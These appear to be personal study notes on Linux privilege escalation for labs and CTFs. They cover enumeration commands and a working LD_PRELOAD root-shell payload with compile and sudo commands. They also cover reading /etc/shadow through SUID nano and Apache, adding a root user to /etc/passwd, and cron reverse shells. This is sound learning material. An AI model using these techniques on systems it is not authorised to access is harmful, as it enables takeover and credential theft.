# Linux PE

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/a85498c8-a854-4ca0-be5a-e5bb39c808e6/07ae3b42-164b-480a-aa1b-4021e623e49c/Untitled.png)

Going from a lower permission account to a higher permission one.

it's the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.

*   **Enumeration:**

    ***

    ### ENUMERATION

    ***

    ### PS Command

    ## PS Command

    ***

    A effective way to see the running processes on a Linux system.

    View all running processes:

    ```python
    ps -A
    ```

    View process tree :

    ```python
    ps axjf
    ```

    ![xsbohSd.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/a85498c8-a854-4ca0-be5a-e5bb39c808e6/a28c79df-63b9-46c1-967a-1b01c7b00ff4/xsbohSd.png)

    To show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x).

    Gives better understanding of the system and potential vulnerabilities.

    ```python
    ps aux
    ```

    **The output of the `ps` (Process Status) will show**

    * PID: The process ID (unique to the process)
    * TTY: Terminal type used by the user
    * Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)
    * CMD: The command or executable running (will NOT display any command line parameter)

    ***

    ### **find Command**

    ## Find Command

    ***

    find the file named “flag1.txt” in the current directory

    ```cpp
    find . -name flag1.txt
    ```

    find the file names “flag1.txt” in the /home directory

    ```cpp
    find /home -name flag1.txt
    ```

    find the directory named config under “/”

    ```cpp
    find / -type d -name config
    ```

    * `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)

    ```cpp
    ```

    * `find / -perm a=x`: find executable files

    ```cpp
    ```

    * `find /home -user frank`: find all files for user “frank” under “/home”

    ```cpp
    ```

    * `find / -mtime 10`: find files that were modified in the last 10 days
    * `find / -atime 10`: find files that were accessed in the last 10 day
    * `find / -cmin -60`: find files changed within the last hour (60 minutes)
    * `find / -amin -60`: find files accesses within the last hour (60 minutes)
    * `find / -size 50M`: find files with a 50 MB size

    This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size.

    use the “find” command with “-type f 2>/dev/null” to redirect errors to “/dev/null” and have a cleaner output (below).

    ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/a85498c8-a854-4ca0-be5a-e5bb39c808e6/edbb9076-15b4-40fd-9710-528cb743adb6/Untitled.png)

    Folders and files that can be written to or executed from:

    * `find / -writable -type d 2>/dev/null` : Find world-writeable folders
    * `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
    * `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders
    * `find / -perm -o x -type d 2>/dev/null` : Find world-executable folders

    Find development tools and supported languages:

    * `find / -name perl*`
    * `find / -name python*`
    * `find / -name gcc*`
    * `find / -perm -u=s -type f 2>/dev/null`: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.

    ***

    ### netstat

    ## Netstat

    ***

    Following an initial check for existing interfaces and network routes, it is worth looking into existing communications.

    Commands:

    * `netstat -a`: shows all listening ports and established connections.
    * `netstat -at` or `netstat -au` can also be used to list TCP or UDP protocols respectively.
    * `netstat -l`: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)
    * `netstat -s`: list network usage statistics by protocol (below) This can also be used with the `-t` or `-u` options to limit the output to a specific protocol.
    * `netstat -tp`: list connections with the service name and PID information.
    * `netstat -i`: Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”.

    The `netstat` usage you will probably see most often in blog posts, write-ups, and courses is `netstat -ano` which could be broken down as follows;

    * `a`: Display all sockets
    * `n`: Do not resolve names
    * `o`: Display timers

    ***

    #### /etc/issue

    Systems can also be identified by looking at the `/etc/issue` file. This file usually contains some information about the operating system but can easily be customized or changed.

    #### /etc/passwd

    Reading the `/etc/passwd` file can be an easy way to discover users on the system.

    ![r6oYOEi.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/a85498c8-a854-4ca0-be5a-e5bb39c808e6/f2c1df23-f73d-4bad-86ae-3e406136d123/r6oYOEi.png)

    ![cpS2U93.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/a85498c8-a854-4ca0-be5a-e5bb39c808e6/afa4d12f-c309-4175-933c-09e0d5bda965/cpS2U93.png)

    ![psxE6V4.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/a85498c8-a854-4ca0-be5a-e5bb39c808e6/d019cd4d-263a-488f-b4b5-526fcb4699e3/psxE6V4.png)

    **To return the hostname of the target machine:**

    ```python
    hostname
    ```

    **Will print system info about the kernel (version and if compiler like GCC is installed) used by the system.**

    **Imp for searching for any potential kernel vulnerabilities that could lead to privesc.**

    ```python
    uname -a
    ```

    It will show environmental variables:

    ```python
    env
    ```

    To provide a general overview of the user’s privilege level and group memberships

    ```python
    id
    ```

    To list all commands your user can run using commands with root privileges

    ```python
    sudo -l
    ```

    ***
*   **Kernel Exploits**

    ## Kernel Exploits

    manages the communication between components such as the memory on the system and applications.

    #### It’s Methodology:

    1. Identify the kernel version
    2. Search and find an exploit code for the kernel version of the target system
    3. Run the exploit

    LES (Linux Exploit Suggester)

    * **Hints/Notes:**
      1. Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit
      2. Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.
      3. Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
      4. You can transfer the exploit code from your machine to the target system using the `SimpleHTTPServer` Python module and `wget` respectively.
    *   Sources to find exploit code

        [Linux Kernel CVEs | Linux Kernel Vulnerability Tracker](https://www.linuxkernelcves.com/cves)

        ***

    ***

## Sudo

***

#### **Leverage application functions**

Some applications will not have a known exploit within this context.: Apache2 server

use a "hack" to leak information leveraging a function of the application.

Apache2 has an option that supports loading alternative configuration files (`-f` : specify an alternate ServerConfigFile).

\![https://i.imgur.com/rNpbbL8.png](https://i.imgur.com/rNpbbL8.png)

Loading the `/etc/shadow` file using this option will result in an error message that includes the first line of the `/etc/shadow` file.

#### **Leverage LD\_PRELOAD**

LD\_PRELOAD is a function that allows any program to use shared libraries.

[Dynamic linker tricks: Using LD\_PRELOAD to cheat, inject features and investigate programs](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld\_preload-to-cheat-inject-features-and-investigate-programs/)

If the "env\_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run.

1. Check for LD\_PRELOAD (with the env\_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
3. Run the program with sudo rights and the LD\_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows:

```cpp
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;

```cpp
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/a85498c8-a854-4ca0-be5a-e5bb39c808e6/99bb71ad-a838-4241-9d8d-45955e135065/Untitled.png)

to run sudo with the shared files:

```cpp
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

***

## SUID (Set-user Identification)

***

To change the permission of files with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.

You will notice these files have an “s” bit set showing their special permission level.

To list files that have SUID or SGID bits set.

```
find / -type f -perm -04000 -ls 2>/dev/null
```

*   **trick**

    A good practice would be to compare executables on this list with GTFOBins ([https://gtfobins.github.io](https://gtfobins.github.io)). Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set (you can also use this link for a pre-filtered list [https://gtfobins.github.io/#+suid](https://gtfobins.github.io/#+suid)).

    ***

Nano is owned by root, which probably means that we can read and edit files at a higher privilege level than our current user has.

#### we have two basic options for privesc:

*   reading the `/etc/shadow` file

    to see that the nano text editor has the SUID bit set:

    ```cpp
    find /  -type f -perm -04000 -ls 2>/dev/null
    ```

    The unshadow tool’s usage can be seen below;

    `unshadow passwd.txt shadow.txt > passwords.txt`

    \![https://i.imgur.com/6cHBAr1.png](https://i.imgur.com/6cHBAr1.png)
*   adding our user to `/etc/passwd`

    hash value of the password we want the new user to have.

    ![bkOGaHY.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/a85498c8-a854-4ca0-be5a-e5bb39c808e6/a7bb38f6-eb0b-49bf-8687-1f42cf4c06d7/bkOGaHY.png)

    We will then add this password with a username to the `/etc/passwd` file.

    ![huGoEtj.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/a85498c8-a854-4ca0-be5a-e5bb39c808e6/cceb242d-688b-4527-846f-0874a60a7eb0/huGoEtj.png)

    Once our user is added (please note how `root:/bin/bash` was used to provide a root shell) we will need to switch to this user and hopefully should have root privileges.

    ![HZcWGhi.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/a85498c8-a854-4ca0-be5a-e5bb39c808e6/38820b0f-03fe-4eb0-9fe5-0f69a9ed2350/HZcWGhi.png)

***

*   **Capabilities**

    Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary.

    We can use the `getcap` tool to list enabled capabilities.

    ![Q6XYr0p.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/a85498c8-a854-4ca0-be5a-e5bb39c808e6/f0dba059-87db-48a0-b48c-07d834f7b554/Q6XYr0p.png)

    If unprivileged user → will generate many errors

    Please note that neither vim nor its copy has the SUID bit set. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.

    \![https://i.imgur.com/6csoabB.png](https://i.imgur.com/6csoabB.png)

    GTFObins has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.

    We notice that vim can be used with the following command and payload:

    \![https://i.imgur.com/nlpCMWj.png](https://i.imgur.com/nlpCMWj.png)

    This will launch a root shell as seen below;

    \![https://i.imgur.com/jCjvgo3.png](https://i.imgur.com/jCjvgo3.png)

    **What other binary can be used through its capabilities?**

    ```
    getcap -r /
    ```

    ***
*   **Cron Jobs**

    Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.

    The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.

    Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.

    can read the file keeping system-wide cron jobs under `/etc/crontab`

    You can see the `backup.sh` script was configured to run every minute.

    The script will use the tools available on the target system to launch a reverse shell.

    Two points to note;

    1. The command syntax will vary depending on the available tools. (e.g. `nc` will probably not support the `e` option you may have seen used in other cases)
    2. We should always prefer to start reverse shells, as we not want to compromise the system integrity during a real penetration testing engagement.

    The following scenario is not uncommon in companies that do not have a certain cyber security maturity level:

    1. System administrators need to run a script at regular intervals.
    2. They create a cron job to do this
    3. After a while, the script becomes useless, and they delete it
    4. They do not clean the relevant cron job

    ***
* **PATH**
* **NFS**
*   **Automated Enumeration Tools**

    * **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
    * **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
    * **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
    * **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
    * **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

    ***
